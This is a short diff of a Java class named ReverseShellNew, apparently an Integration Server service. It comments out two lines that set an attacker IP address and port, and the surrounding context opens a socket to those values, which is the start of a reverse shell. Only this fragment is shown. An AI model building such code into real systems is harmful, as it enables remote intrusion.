@@ -34,8 +34,8 @@ public final class ReverseShellNew
 	{
 		// --- <<IS-START(JavaNewReverseShellService)>> ---
 		// @sigtype java 3.5
-		String attackerIP = "10.13.66.70";
-		int attackerPort = 80;
+	//	String attackerIP = "10.13.66.70";
+	//	int attackerPort = 80;
 		 
 		try {
 		    Socket socket = new Socket(attackerIP, attackerPort);
